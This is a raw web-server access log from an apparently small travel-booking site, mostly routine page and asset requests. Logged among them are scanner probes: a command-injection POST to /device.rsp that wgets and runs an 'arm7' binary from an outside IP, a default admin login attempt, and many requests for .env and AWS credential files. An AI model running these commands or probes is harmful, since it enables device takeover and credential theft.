Server is running on port:  \\.\pipe\684ff6a8-b112-4b63-b5f6-6204b876d012
[0mGET / [32m200[0m 12.791 ms - 32369[0m
[0mGET / [32m200[0m 12.435 ms - 32369[0m
[0mGET / [32m200[0m 12.102 ms - 32369[0m
[0mGET / [32m200[0m 11.031 ms - 32369[0m
[0mGET / [32m200[0m 12.776 ms - 32369[0m
[0mGET / [32m200[0m 12.930 ms - 32369[0m
[0mGET / [32m200[0m 12.017 ms - 32369[0m
[0mGET / [32m200[0m 11.051 ms - 32369[0m
[0mGET / [32m200[0m 12.054 ms - 32369[0m
[0mGET / [32m200[0m 12.552 ms - 32369[0m
[0mGET / [32m200[0m 12.129 ms - 32369[0m
[0mGET / [32m200[0m 10.605 ms - 32369[0m
[0mGET / [32m200[0m 12.462 ms - 32369[0m
[0mGET / [32m200[0m 12.507 ms - 32369[0m
[0mGET / [32m200[0m 12.001 ms - 32369[0m
[0mGET / [32m200[0m 10.540 ms - 32369[0m
[0mGET / [32m200[0m 12.646 ms - 32369[0m
[0mGET / [32m200[0m 12.148 ms - 32369[0m
[0mGET / [32m200[0m 11.807 ms - 32369[0m
[0mGET / [32m200[0m 9.846 ms - 32369[0m
[0mGET / [32m200[0m 12.306 ms - 32369[0m
[0mGET / [32m200[0m 12.666 ms - 32369[0m
[0mGET / [32m200[0m 12.773 ms - 32369[0m
[0mGET / [32m200[0m 12.540 ms - 32369[0m
[0mGET / [32m200[0m 12.189 ms - 32369[0m
[0mGET / [32m200[0m 10.600 ms - 32369[0m
[0mGET / [32m200[0m 11.582 ms - 32369[0m
[0mGET / [32m200[0m 12.318 ms - 32369[0m
[0mGET / [32m200[0m 11.819 ms - 32369[0m
[0mGET / [32m200[0m 10.925 ms - 32369[0m
[0mGET / [32m200[0m 12.243 ms - 32369[0m
[0mGET / [32m200[0m 13.890 ms - 32369[0m
[0mGET / [32m200[0m 11.995 ms - 32369[0m
[0mGET / [32m200[0m 10.532 ms - 32369[0m
[0mGET / [32m200[0m 12.398 ms - 32369[0m
[0mGET / [32m200[0m 11.885 ms - 32369[0m
[0mGET / [32m200[0m 10.322 ms - 32369[0m
[0mGET / [32m200[0m 10.572 ms - 32369[0m
[0mGET / [32m200[0m 12.179 ms - 32369[0m
[0mGET / [32m200[0m 12.040 ms - 32369[0m
[0mGET / [32m200[0m 10.535 ms - 32369[0m
[0mGET / [32m200[0m 12.488 ms - 32369[0m
[0mGET / [32m200[0m 12.321 ms - 32369[0m
[0mGET / [32m200[0m 11.852 ms - 32369[0m
[0mGET / [32m200[0m 10.516 ms - 32369[0m
[0mGET / [32m200[0m 12.140 ms - 32369[0m
[0mGET / [32m200[0m 12.099 ms - 32369[0m
[0mGET / [32m200[0m 12.206 ms - 32369[0m
[0mGET / [32m200[0m 10.973 ms - 32369[0m
[0mGET / [32m200[0m 12.449 ms - 32369[0m
[0mGET / [32m200[0m 12.263 ms - 32369[0m
[0mGET / [32m200[0m 11.812 ms - 32369[0m
[0mGET / [32m200[0m 11.048 ms - 32369[0m
[0mGET / [32m200[0m 11.993 ms - 32369[0m
[0mGET / [32m200[0m 11.882 ms - 32369[0m
[0mGET / [32m200[0m 10.662 ms - 32369[0m
[0mGET / [32m200[0m 10.817 ms - 32369[0m
[0mGET / [32m200[0m 12.331 ms - 32369[0m
[0mGET / [32m200[0m 11.863 ms - 32369[0m
[0mGET / [32m200[0m 10.504 ms - 32369[0m
[0mGET / [32m200[0m 12.004 ms - 32369[0m
[0mGET / [32m200[0m 12.350 ms - 32369[0m
[0mGET / [32m200[0m 11.041 ms - 32369[0m
[0mGET / [32m200[0m 10.708 ms - 32369[0m
[0mGET / [32m200[0m 12.266 ms - 32369[0m
[0mGET / [32m200[0m 12.050 ms - 32369[0m
[0mGET / [32m200[0m 10.810 ms - 32369[0m
[0mGET / [32m200[0m 10.643 ms - 32369[0m
[0mGET / [32m200[0m 12.533 ms - 32369[0m
[0mGET / [32m200[0m 11.502 ms - 32369[0m
[0mGET / [32m200[0m 10.499 ms - 32369[0m
[0mGET / [32m200[0m 12.461 ms - 32369[0m
[0mGET / [32m200[0m 12.533 ms - 32369[0m
[0mGET / [32m200[0m 10.578 ms - 32369[0m
[0mGET / [32m200[0m 11.508 ms - 32369[0m
[0mGET /favicon.ico [33m404[0m 2.906 ms - 150[0m
[0mGET / [32m200[0m 11.784 ms - 32369[0m
[0mGET /geoserver/web/ [33m404[0m 2.799 ms - 153[0m
[0mGET / [32m200[0m 12.607 ms - 32369[0m
[0mGET / [32m200[0m 12.826 ms - 32369[0m
[0mGET / [32m200[0m 12.570 ms - 32369[0m
[0mGET / [32m200[0m 9.710 ms - 32369[0m
[0mGET / [32m200[0m 12.343 ms - 32369[0m
[0mGET / [32m200[0m 12.879 ms - 32369[0m
[0mGET / [32m200[0m 11.953 ms - 32369[0m
[0mGET / [32m200[0m 10.504 ms - 32369[0m
[0mGET / [32m200[0m 12.320 ms - 32369[0m
[0mGET / [32m200[0m 12.350 ms - 32369[0m
[0mGET / [32m200[0m 11.608 ms - 32369[0m
[0mGET / [32m200[0m 10.430 ms - 32369[0m
[0mGET / [32m200[0m 12.069 ms - 32369[0m
[0mGET / [32m200[0m 12.114 ms - 32369[0m
[0mGET / [32m200[0m 11.899 ms - 32369[0m
[0mGET / [32m200[0m 10.490 ms - 32369[0m
[0mGET / [32m200[0m 12.281 ms - 32369[0m
[0mGET / [32m200[0m 12.267 ms - 32369[0m
[0mGET / [32m200[0m 11.831 ms - 32369[0m
[0mGET / [32m200[0m 10.436 ms - 32369[0m
[0mGET / [32m200[0m 12.252 ms - 32369[0m
[0mGET / [32m200[0m 12.050 ms - 32369[0m
[0mGET / [32m200[0m 11.700 ms - 32369[0m
[0mGET / [32m200[0m 9.990 ms - 32369[0m
[0mGET / [32m200[0m 12.082 ms - 32369[0m
[0mGET /boaform/admin/formLogin?username=admin&psd=admin [33m404[0m 2.928 ms - 162[0m
[0mGET / [32m200[0m 12.456 ms - 32369[0m
[0mGET / [32m200[0m 12.111 ms - 32369[0m
[0mGET / [32m200[0m 10.529 ms - 32369[0m
[0mGET / [32m200[0m 10.460 ms - 32369[0m
[0mGET / [32m200[0m 12.114 ms - 32369[0m
[0mGET / [32m200[0m 11.809 ms - 32369[0m
[0mGET / [32m200[0m 10.436 ms - 32369[0m
[0mGET / [32m200[0m 11.424 ms - 32369[0m
[0mGET / [32m200[0m 12.065 ms - 32369[0m
[0mGET / [32m200[0m 12.573 ms - 32369[0m
[0mGET /assets/img/img_1.png [32m200[0m 2.711 ms - 4486[0m
[0mGET / [32m200[0m 10.285 ms - 32369[0m
[0mPOST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F103.163.215.73%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk [33m404[0m 2.633 ms - 150[0m
[0mGET / [32m200[0m 10.555 ms - 32369[0m
[0mGET /.AWS/credentials [33m404[0m 3.504 ms - 155[0m
[0mGET /.AWS/CREDENTIALS [33m404[0m 2.838 ms - 155[0m
[0mGET /.Aws/credentials [33m404[0m 4.985 ms - 155[0m
[0mGET /.CONFIG.yaml [33m404[0m 3.198 ms - 151[0m
[0mGET /.Config.yaml [33m404[0m 2.710 ms - 151[0m
[0mGET /.env.BAK [33m404[0m 2.800 ms - 147[0m
[0mGET /.ENV.example [33m404[0m 2.862 ms - 151[0m
[0mGET /.env.EXAMPLE [33m404[0m 2.785 ms - 151[0m
[0mGET /.ENV.EXAMPLE [33m404[0m 2.779 ms - 151[0m
[0mGET /ADMIN/.env [33m404[0m 10.331 ms - 149[0m
[0mGET /Admin/.env [33m404[0m 7.773 ms - 149[0m
[0mGET /Application/.env [33m404[0m 2.620 ms - 155[0m
[0mGET /APPLICATION/.env [33m404[0m 2.668 ms - 155[0m
[0mGET /BACKEND/.env [33m404[0m 2.659 ms - 151[0m
[0mGET /Config/.env [33m404[0m 2.698 ms - 150[0m
[0mGET /CONFIG/.env [33m404[0m 3.066 ms - 150[0m
[0mGET /Core/.env [33m404[0m 2.650 ms - 148[0m
[0mGET /CORE/.env [33m404[0m 2.659 ms - 148[0m
[0mGET /Cp/.env [33m404[0m 2.815 ms - 146[0m
[0mGET /CP/.env [33m404[0m 2.530 ms - 146[0m
[0mGET /Credentials [33m404[0m 2.978 ms - 150[0m
[0mGET /CREDENTIALS [33m404[0m 2.514 ms - 150[0m
[0mGET /Crm/.env [33m404[0m 3.095 ms - 147[0m
[0mGET /CRM/.env [33m404[0m 2.599 ms - 147[0m
[0mGET /Data/.env [33m404[0m 2.556 ms - 148[0m
[0mGET /DATA/.env [33m404[0m 2.612 ms - 148[0m
[0mGET / [32m200[0m 9.805 ms - 32369[0m
[0mGET / [32m200[0m 10.907 ms - 32369[0m
[0mGET / [32m200[0m 11.971 ms - 32369[0m
[0mGET / [32m200[0m 11.916 ms - 32369[0m
[0mGET / [32m200[0m 10.453 ms - 32369[0m
[0mGET / [32m200[0m 11.687 ms - 32369[0m
[0mGET / [32m200[0m 12.257 ms - 32369[0m
[0mGET / [32m200[0m 12.012 ms - 32369[0m
[0mGET / [32m200[0m 10.554 ms - 32369[0m
[0mGET / [32m200[0m 11.526 ms - 32369[0m
[0mGET / [32m200[0m 12.145 ms - 32369[0m
[0mGET / [32m200[0m 12.071 ms - 32369[0m
[0mGET / [32m200[0m 10.915 ms - 32369[0m
[0mGET / [32m200[0m 12.300 ms - 32369[0m
[0mGET / [32m200[0m 12.076 ms - 32369[0m
[0mGET / [32m200[0m 12.045 ms - 32369[0m
undefined
[0mGET /subUser_changePassword [36m302[0m 4.248 ms - 23[0m
[0mGET / [32m200[0m 9.778 ms - 32369[0m
[0mGET / [32m200[0m 10.572 ms - 32369[0m
[0mGET / [32m200[0m 12.217 ms - 32369[0m
[0mGET / [32m200[0m 12.121 ms - 32369[0m
[0mGET / [32m200[0m 11.267 ms - 32369[0m
[0mGET / [32m200[0m 12.098 ms - 32369[0m
[0mGET / [32m200[0m 12.485 ms - 32369[0m
[0mGET / [32m200[0m 11.740 ms - 32369[0m
[0mGET /hudson [33m404[0m 2.636 ms - 145[0m
[0mGET / [32m200[0m 10.566 ms - 32369[0m
[0mGET / [32m200[0m 9.726 ms - 32369[0m
[0mGET / [32m200[0m 12.200 ms - 32369[0m
[0mGET /hljbuv52.live.bestvcdn.com.cn/live/program/live/cctv1hd8m/8000000/mnf.m3u8 [33m404[0m 2.866 ms - 213[0m
[0mGET /hljbuv52.live.bestvcdn.com.cn/0/live/program/live/cctv1hd8m/8000000/mnf.m3u8 [33m404[0m 2.676 ms - 215[0m
[0mGET / [32m200[0m 16.027 ms - 32369[0m
[0mGET / [32m200[0m 12.865 ms - 32369[0m
[0mGET / [32m200[0m 10.465 ms - 32369[0m
[0mGET /robots.txt [33m404[0m 2.581 ms - 149[0m
[0mGET /assets/images/travel-insurance.png [32m200[0m 2.526 ms - 38063[0m
[0mGET / [32m200[0m 11.072 ms - 32369[0m
[0mGET / [32m200[0m 13.274 ms - 32369[0m
[0mGET / [32m200[0m 12.110 ms - 32369[0m
[0mGET / [32m200[0m 11.955 ms - 32369[0m
[0mGET / [32m200[0m 9.794 ms - 32369[0m
[0mGET / [32m200[0m 11.933 ms - 32369[0m
[0mGET / [32m200[0m 12.367 ms - 32369[0m
[0mGET / [32m200[0m 12.111 ms - 32369[0m
[0mGET / [32m200[0m 11.256 ms - 32369[0m
[0mGET / [32m200[0m 11.683 ms - 32369[0m
[0mGET / [32m200[0m 12.807 ms - 32369[0m
[0mGET / [32m200[0m 13.364 ms - 32369[0m
[0mGET / [32m200[0m 10.553 ms - 32369[0m
[0mGET / [32m200[0m 11.643 ms - 32369[0m
[0mGET / [32m200[0m 11.714 ms - 32369[0m
[0mGET /assets/img/img_1.png [32m200[0m 2.387 ms - 4486[0m
[0mGET / [32m200[0m 11.618 ms - 32369[0m
[0mGET / [32m200[0m 10.906 ms - 32369[0m
[0mGET / [32m200[0m 12.378 ms - 32369[0m
[0mGET / [32m200[0m 12.572 ms - 32369[0m
[0mGET /assets/js/contact-form-script.js [32m200[0m 2.614 ms - 1256[0m
[0mGET /assets/js/meanmenu.min.js [32m200[0m 2.613 ms - 5351[0m
[0mGET /assets/js/script.js [32m200[0m 2.786 ms - 7050[0m
[0mGET /assets/js/form-validator.min.js [32m200[0m 2.519 ms - 7729[0m
[0mGET /assets/js/owl.carousel.min.js [32m200[0m 2.930 ms - 44342[0m
[0mGET / [32m200[0m 12.286 ms - 32369[0m
[0mGET / [32m200[0m 12.323 ms - 32369[0m
[0mGET / [32m200[0m 10.477 ms - 32369[0m
[0mGET /assets/css/bootstrap.min.css [32m200[0m 2.590 ms - 299045[0m
[0mGET /assets/css/fontawesome.min.css [32m200[0m 2.393 ms - 103012[0m
[0mGET /assets/css/boxicons.min.css [32m200[0m 5.179 ms - 84759[0m
[0mGET /assets/css/animate.min.css [32m200[0m 4.775 ms - 71764[0m
[0mGET /assets/css/bootstrap-datepicker.min.css [32m200[0m 5.051 ms - 15734[0m
[0mGET /assets/css/nice-select.css [32m200[0m 2.189 ms - 3070[0m
[0mGET /assets/css/magnific-popup.min.css [32m200[0m 2.105 ms - 5235[0m
[0mGET /assets/css/owl.carousel.min.css [32m200[0m 2.091 ms - 3353[0m
[0mGET /assets/css/meanmenu.min.css [32m200[0m 2.067 ms - 2309[0m
[0mGET /assets/css/style.css [32m200[0m 2.137 ms - 124545[0m
[0mGET /assets/css/style1.css [32m200[0m 2.077 ms - 2046[0m
[0mGET /assets/css/responsive.css [32m200[0m 2.156 ms - 16523[0m
[0mGET /assets/css/theme-dark.css [32m200[0m 2.013 ms - 7831[0m
[0mGET /assets/css/registerAgent.css [32m200[0m 2.537 ms - 20308[0m
[0mGET /assets/img/TDO_DUBAI.png [32m200[0m 2.147 ms - 388600[0m
[0mGET /assets/img/TDO_logo1.png [32m200[0m 1.998 ms - 391964[0m
[0mGET /assets/js/jquery.min.js [32m200[0m 3.051 ms - 87532[0m
[0mGET /assets/images/hotels.png [32m200[0m 2.458 ms - 42233[0m
[0mGET /assets/images/travel-insurance.png [32m200[0m 4.105 ms - 38063[0m
[0mGET /assets/images/flights.png [32m200[0m 3.310 ms - 62486[0m
[0mGET /assets/fonts/boxicons.woff2 [32m200[0m 2.073 ms - 117788[0m
[0mGET /assets/images/bg1.jpg [32m200[0m 2.005 ms - 282103[0m
[0mGET /assets/js/bootstrap.bundle.min.js [32m200[0m 2.091 ms - 80672[0m
[0mGET /assets/js/bootstrap-datepicker.min.js [32m200[0m 2.139 ms - 33871[0m
[0mGET /assets/js/jquery.nice-select.min.js [32m200[0m 2.017 ms - 2942[0m
[0mGET /assets/js/jquery.magnific-popup.min.js [32m200[0m 2.046 ms - 20216[0m
[0mGET /assets/js/jquery.filterizr.min.js [32m200[0m 2.058 ms - 49179[0m
[0mGET /assets/js/owl.carousel.min.js [32m200[0m 4.167 ms - 44342[0m
[0mGET /assets/js/meanmenu.min.js [32m200[0m 2.045 ms - 5351[0m
[0mGET /assets/js/form-validator.min.js [32m200[0m 2.028 ms - 7729[0m
[0mGET /assets/js/contact-form-script.js [32m200[0m 1.997 ms - 1256[0m
[0mGET /assets/js/jquery.ajaxchimp.min.js [32m200[0m 1.981 ms - 2381[0m
[0mGET /assets/js/script.js [32m200[0m 2.032 ms - 7050[0m
[0mGET /assets/images/visa.png [32m200[0m 2.068 ms - 4221[0m
[0mGET /assets/img/TDO_FooterLogo.jpeg [32m200[0m 2.057 ms - 129992[0m
[0mGET /assets/img/img_1.png [32m200[0m 1.965 ms - 4486[0m
[0mGET / [32m200[0m 14.950 ms - 32369[0m
[0mGET / [32m200[0m 12.935 ms - 32369[0m
[0mGET / [32m200[0m 11.951 ms - 32369[0m
